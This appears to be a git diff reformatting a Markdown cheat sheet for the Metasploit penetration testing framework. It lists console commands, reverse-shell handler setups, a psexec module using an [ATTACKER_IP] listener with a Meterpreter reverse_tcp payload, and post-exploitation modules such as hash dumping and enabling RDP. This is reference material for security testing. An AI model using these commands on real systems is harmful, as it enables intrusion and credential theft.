@@ -2,11 +2,17 @@
 title: METASPLOIT
 summary: A penetration testing framework.
 description: A penetration testing framework.
+tags:
+  - metasploit
+---
+
+# METASPLOIT
+
 ---
 
 **[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)**
 
-## Terminology
+### Terminology
 
 ### Non-Staged Payload
 
@@ -37,85 +43,89 @@ Example: windows/meterpreter/reverse_tcp.
 
 Source: https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html
 
-## Console
+---
+
+### Console
 
 
  > 
- > **<font color=red>msfdb init</font>**</br>
+ > **<font color=red>msfdb init</font>**<br>
  > Initialize database.
  > 
- > **<font color=red>msfconsole</font>**</br>
+ > **<font color=red>msfconsole</font>**<br>
  > Start metasploit console.
  > 
- > **<font color=red>db_status</font>**</br>
+ > **<font color=red>db_status</font>**<br>
  > Check database connection.
 
  > 
- > **<font color=red>search </font>\[SERVICE_TO_EXPLOIT\]**</br>
+ > **<font color=red>search </font>\[SERVICE_TO_EXPLOIT\]**<br>
  > Search for an exploit to use against the specified service.
  > 
- > **<font color=red>use</font> \[MODULE\]**</br>
+ > **<font color=red>use</font> \[MODULE\]**<br>
  > Select a module.
  > 
- > **<font color=red>use auxiliary</font>**</br>
+ > **<font color=red>use auxiliary</font>**<br>
  > Select an auxiliary module. 
 
  > 
- > **<font color=red>info</font>**</br>
+ > **<font color=red>info</font>**<br>
  > Display information about selected module.
  > 
- > **<font color=red>show options</font>**</br>
+ > **<font color=red>show options</font>**<br>
  > Show variables (options) of selected module.
 
  > 
- > **<font color=red>set</font> \[VARIABLE\] \[VALUE\]**</br>
+ > **<font color=red>set</font> \[VARIABLE\] \[VALUE\]**<br>
  > Set variable (option) of selected module.
  > 
- > **<font color=red>setg</font> \[VARIABLE\] \[VALUE\]**</br>
+ > **<font color=red>setg</font> \[VARIABLE\] \[VALUE\]**<br>
  > Set variable (option) globaly (for all modules).
  > 
- > **<font color=red>unset</font> \[VARIABLE\] \[VALUE\]**</br>
+ > **<font color=red>unset</font> \[VARIABLE\] \[VALUE\]**<br>
  > Unset variable.
 
  > 
- > **<font color=red>exploit</font>**</br>
+ > **<font color=red>exploit</font>**<br>
  > Run the exploit (**<font color=red>-j</font>** to run it in background job). **run** is an alias to exploit.
 
  > 
- > **<font color=red>sessions -l</font>**</br>
+ > **<font color=red>sessions -l</font>**<br>
  > List opened sessions.
  > 
- > **<font color=red>sessions</font> 1**</br>
+ > **<font color=red>sessions</font> 1**<br>
  > Open session 1.
  > 
- > **<font color=red>background</font>**</br>
+ > **<font color=red>background</font>**<br>
  > Background session (Ctrl + z).
 
  > 
- > **<font color=red>connect</font> \[HOST\]**</br>
+ > **<font color=red>connect</font> \[HOST\]**<br>
  > Netcat like connection.
  > 
- > **<font color=red>spool</font>**</br>
+ > **<font color=red>spool</font>**<br>
  > Write console output into a file as well the screen.
 
-## Modules
+---
+
+### Modules
 
 ### Handler Multi
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**<br>
  > 
- > **<font color=red>set payload linux/x86/meterpreter/reverse_tcp</font>**</br>
- > **<font color=red>exploit</font>**</br>
+ > **<font color=red>set payload linux/x86/meterpreter/reverse_tcp</font>**<br>
+ > **<font color=red>exploit</font>**<br>
  > Handler for linux (efl) reverse shell.
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**<br>
  > 
- > \*\*<font color=red>set payload windows/x64/meterpreter/reverse_tcp</font> \*\*</br>
- > **<font color=red>exploit</font>**</br>
+ > \*\*<font color=red>set payload windows/x64/meterpreter/reverse_tcp</font> \*\*<br>
+ > **<font color=red>exploit</font>**<br>
  > Handler for Windows Meterpreter.
 
 ### Reverse Shell Windows
@@ -124,52 +134,52 @@ Source: https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-r
  > 
  > **<font color=red>use</font> <font color=lightblue>exploit/windows/smb/psexec</font>**
  > 
- > **<font color=red>set lhost</font> \[ATTACKER_IP\]**</br>
- > **<font color=red>set rhosts</font> \[TARGET_IP\]**</br>
- > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**</br>
- > **<font color=red>set smbuser </font>\[TARGET_USER\]**</br>
- > **<font color=red>set smbpass</font> \[TARGET_IP\]**</br>
- > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**</br>
- > **<font color=red>exploit</font>**</br>
+ > **<font color=red>set lhost</font> \[ATTACKER_IP\]**<br>
+ > **<font color=red>set rhosts</font> \[TARGET_IP\]**<br>
+ > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**<br>
+ > **<font color=red>set smbuser </font>\[TARGET_USER\]**<br>
+ > **<font color=red>set smbpass</font> \[TARGET_IP\]**<br>
+ > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**<br>
+ > **<font color=red>exploit</font>**<br>
  > Create a reverse shell from a SMB share.
 
 ### Post Exploit Multi
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>multi/manage/shell_to_meterpreter</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>multi/manage/shell_to_meterpreter</font>**<br>
  > Upgrade shell to a Meterpreter session.
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>post/multi/recon/local_exploit_suggester</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>post/multi/recon/local_exploit_suggester</font>**<br>
  > Check exploits for privilege escalation.
 
 ### Post Exploit Windows
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>post/windows/gather/checkvm</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>post/windows/gather/checkvm</font>**<br>
  > Check if the machine a VM.
 
  > 
- > **<font color=red>use</font> <font color=lightblue>post/windows/manage/enable_rdp</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>post/windows/manage/enable_rdp</font>**<br>
  > Try to enable RDP.
 
  > 
- > **<font color=red>use</font> <font color=lightblue>post/windows/gather/enum_shares</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>post/windows/gather/enum_shares</font>**<br>
  > Enumerate shares.
 
 ### Post Exploit Linux
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>linux/gather/hashdump</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>linux/gather/hashdump</font>**<br>
  > Dump users hashes.
 
 ### Auxiliary SMB
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>auxiliary/scanner/smb/smb_enum_gpp</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>auxiliary/scanner/smb/smb_enum_gpp</font>**<br>
  > Detect vulnerable GPP policies (credentials encrypted with leaked key).
